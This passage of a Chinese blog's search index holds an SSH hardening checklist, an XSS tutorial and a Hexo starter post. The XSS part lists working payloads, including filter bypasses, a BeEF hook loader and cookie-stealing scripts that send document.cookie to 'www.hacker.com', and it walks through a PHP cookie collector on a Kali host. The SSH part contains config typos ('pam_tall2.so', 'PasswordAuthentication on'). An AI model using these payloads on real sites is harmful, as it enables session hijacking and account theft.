class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>useradd shell 【推荐】</span><br><span class="line">[root@tianyun ~]<span class="comment"># useradd yangge -s /sbin/nologin</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>密码复杂性【推荐】</span><br><span class="line">字母大小写+数字+特殊字符+<span class="number">20</span>位以上+定期更换</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>修改默认端口【推荐】</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">    Port <span class="number">22222</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>限止登录的用户和组【推荐】</span><br><span class="line">    <span class="comment">#PermitRootLogin yes</span></span><br><span class="line">    AllowUser yangger</span><br><span class="line">    </span><br><span class="line">    [root@tianyun ~]<span class="comment"># man sshd_config</span></span><br><span class="line">    AllowUser AllowGroups DenyUsers DenyGroups</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="number">5.</span>设置允许的IP访问【可选】</span><br><span class="line">    /etc/hosts.allow,例如sshd:<span class="number">192.168</span><span class="number">.106</span><span class="number">.167</span>:allow</span><br><span class="line">    PAM基于IP限制</span><br><span class="line">    iptables/firewalld</span><br><span class="line">    只能允许从堡垒机</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="number">6.</span>使用DenyHosts自动统计，并将其加入到/etc/hosts.deny</span><br><span class="line">        </span><br><span class="line"><span class="number">7.</span>基于PAM实现登陆限制【推荐】</span><br><span class="line">   模块：pam_tally2.so</span><br><span class="line">   功能：登陆统计</span><br><span class="line">   示例：实现防止对sshd暴力破解</span><br><span class="line">   [root@tianyun ~]<span class="comment"># grep tally2 /etc/pam.d/sshd</span></span><br><span class="line">   auth  required pam_tall2.so deny=<span class="number">2</span> even_deny_root root_unlock_time=<span class="number">30</span> unlock_time=<span class="number">30</span></span><br><span class="line">    <span class="comment">#pam_tall2.so登陆模块，统计登陆错误次数（deny）为2次，even_deny_root是只root用户，root用户不例外。root_unlock_time是root用户的锁定时间，unlock_time普通用户的锁定时间30秒。 </span></span><br><span class="line">        </span><br><span class="line"><span class="number">8.</span>禁用密码改用公钥方式认证</span><br><span class="line">    /etc/ssh/sshd_config</span><br><span class="line">    PasswordAuthentication on</span><br><span class="line">        </span><br><span class="line"><span class="number">9.</span>保护xshell导出会话文件【小心】</span><br><span class="line">        </span><br><span class="line"><span class="number">10.</span>GRUB加密【针对本地破解】</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - SSH密码暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨站脚本攻击XSS</title>
      <link href="/2020/04/23/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
      <url>/2020/04/23/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="跨站脚本攻击XSS"><a href="#跨站脚本攻击XSS" class="headerlink" title="跨站脚本攻击XSS"></a>跨站脚本攻击XSS</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>跨站脚本（ceoss site cript）为了避免与样式混淆，所以简称XSS</p><p>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。</p><p>XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中，使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料，利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p><p>XSS攻击的危害：</p><ol><li>盗取各类用户账号，如机器登陆账号、用户网银账号、各类管理账号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其他网站发起攻击</li></ol><h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581311436269.png"  alt="1581311436269"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581311705270.png"  alt="1581311705270"></p><p>XSS主要原因：过度信任客户端提交的数据</p><p>XSS主要分类：</p><ul><li>反射型XSS攻击（Reflected XSS）又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接（即每次攻击需要用户的点击）。</li><li>存储型XSS（Stored XSS）又称为持久型跨站点脚本，它一般发生在XSS攻击向量（一般指XSS攻击代码）存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开游览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大，因为每当用户打开页面，查看内容时脚本将会自动执行。谷歌的orkut曾经就遭受到XSS。</li></ul><h2 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h2><h3 id="常用的HTML标签"><a href="#常用的HTML标签" class="headerlink" title="常用的HTML标签"></a>常用的HTML标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>iframe 元素会创建包含另外一个文档的内联框架（即行内框架）</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>标签定义多行文本输入控件</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>img 元素向网页嵌入一副图片</span><br><span class="line"><span class="tag">&lt;<span class="name">sript</span>&gt;</span><span class="tag">&lt;<span class="name">sript</span>&gt;</span>标签用语定义客户端。比如JavaScript</span><br><span class="line">    script 元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件</span><br><span class="line">    必需的type属性规定脚本的 MIME 类型</span><br><span class="line">    JAVAScript 的常见应用时图像操作、表单验证以及动态内容更新</span><br></pre></td></tr></table></figure><h3 id="常用的JavaScript方法"><a href="#常用的JavaScript方法" class="headerlink" title="常用的JavaScript方法"></a>常用的JavaScript方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alertalert() 方法用于显示带有一条指定消息和一个确认按钮的警告框</span><br><span class="line">window.locationwindow.location对象用于获得当前网页的地址（URL），并把游览器重定向到新的页面</span><br><span class="line">location.href返回当前显示的文档的完整URl</span><br><span class="line">onload一张页面或一副图像完成加载</span><br><span class="line">onsubmit确认按钮被点击</span><br><span class="line">onerror在加载文档或图像时发生错误</span><br></pre></td></tr></table></figure><h3 id="构造XSS脚本-1"><a href="#构造XSS脚本-1" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h3><p>​    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">弹框警告</span><br><span class="line">此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号&#39;，一旦此脚本能执行，也就意味着后端服务没有对特殊字符做过滤&lt;&gt;&#x2F;&#39;就这样可以证明，这个液面位置存在XSS漏洞</span><br><span class="line">&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;300 height&#x3D;300&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;0 height&#x3D;0 border&#x3D;0&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(&quot;请移步到我们的新站&quot;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(&#39;XSS&#39;);location.href&#x3D;&quot;http:&#x2F;&#x2F;10.1.64.35&#x2F;mutillidea&#x2F;robots.txt&quot;&lt;&#x2F;script&gt;</span><br><span class="line">这里结合一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这些信息，则可可能在另外的站点重新登录（克隆网站收集账号）</span><br><span class="line"></span><br><span class="line">访问恶意代码</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&#x2F;XSS.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;#结合BeEF收集用户的Cookie</span><br><span class="line"></span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">绕过过滤的脚本</span><br><span class="line">大小写&lt;ScrIpt&gt;alert(&#39;xss&#39;)&lt;&#x2F;SCRipt&gt;#通过改变标签的大小写绕过</span><br><span class="line">字符编码 采用URL、Base64等编码</span><br><span class="line">&lt;a</span><br><span class="line">href&#x3D;&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt;yangge&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">收集用户cookie</span><br><span class="line">打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页</span><br><span class="line">&lt;script&gt;window.open(&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#39;+document.cookie&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;document.cookie&quot;&gt;&lt;iframe&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;document.cookie&quot;;</span><br><span class="line">    img.width &#x3D; 0;img.height &#x3D; 0;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>弹框操作</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581317417070.png"  alt="1581317417070"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581317441166.png"  alt="1581317441166"><br>$$</p><p>$$</p><h3 id="实例：攻击-获取cookie：渗透机kali-linux端操作"><a href="#实例：攻击-获取cookie：渗透机kali-linux端操作" class="headerlink" title="实例：攻击 获取cookie：渗透机kali linux端操作"></a>实例：攻击 获取cookie：渗透机kali linux端操作</h3><ol><li><p>构造收集cookie服务器</p></li><li><p>构造XSS代码并植入到web服务器</p></li><li><p>等待肉鸡触发XSS代码并将cookie发送到kali</p></li><li><p>Cookie利用</p></li></ol><p>在kali启动apache2服务</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581319707486.png"  alt="1581319707486"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kail:~<span class="comment"># vim/var/www/html/cookie_rec.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$cookie . <span class="string">"\n"</span>);</span><br><span class="line">    fclose($log);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581320754497.png"  alt="1581320754497"></p><p>修改权限</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># chown -R www-data.www-data /var/www/</span></span><br></pre></td></tr></table></figure><p>通过渗透机植入XSS代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;192.168.19.137&#x2F;cookie_rec.php?cookie&#x3D;&#39;+document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line">注：192.168.19.137 为kali Linux IP</span><br><span class="line">注：先清除之前植入的XSS代码</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581322939111.png"  alt="1581322939111"></p><p>在/var/www/html/cookie.txt文件中查看cookie</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581323115654.png"  alt="1581323115654"></p><h2 id="自动化XSS"><a href="#自动化XSS" class="headerlink" title="自动化XSS"></a>自动化XSS</h2><h3 id="BeEF简介"><a href="#BeEF简介" class="headerlink" title="BeEF简介"></a>BeEF简介</h3><p>Browser Exploitation Framework（BeEF）</p><p>BeEF是目前最强大的游览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透；</p><p>BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单；</p><p><a href="http://beefproject.com/" target="_blank" rel="noopener">http://beefproject.com/</a></p><p><strong>信息收集：</strong></p><ol><li>网络发现</li><li>主机信息</li><li>Cookie获取</li><li>会话劫持</li><li>键盘记录</li><li>插件信息</li></ol><p><strong>持久化控制：</strong></p><ol><li>确认弹窗</li><li>小窗口</li><li>中间人</li></ol><p><strong>社会工程：</strong></p><ol><li>点击劫持</li><li>弹窗警告</li><li>虚假页面</li><li>钓鱼页面</li></ol><p><strong>渗透攻击：</strong></p><ol><li>内网渗透</li><li>Metasploit</li><li>CSRF攻击</li><li>DDOS攻击</li></ol><h3 id="BeEF基础"><a href="#BeEF基础" class="headerlink" title="BeEF基础"></a>BeEF基础</h3><p>启动Apache和BeEF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># service apache2 start</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581323986109.png"  alt="1581323986109"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581324057328.png"  alt="1581324057328"></p><p>登陆beef，账号密码都为：beef</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325238917.png"  alt="1581325238917"></p><p>配置攻击命令</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325374494.png"  alt="1581325374494"></p><p>注：192.168.19.137 为kali linux的ip地址</p><p>肉鸡被攻击后在beef的显示</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325543357.png"  alt="1581325543357"></p><p>信息收集</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325726072.png"  alt="1581325726072"></p><p>命令颜色（color）：</p><p>绿色    对目标主机生效并且不可见（不会被发现）</p><p>橙色    对目标主机生效但可能可见（可能被发现）</p><p>灰色    对目标主机未必生效（可验证下）</p><p>红色    对目标主机不生效</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325928305.png"  alt="1581325928305"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/04/23/hello-world/"/>
      <url>/2020/04/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
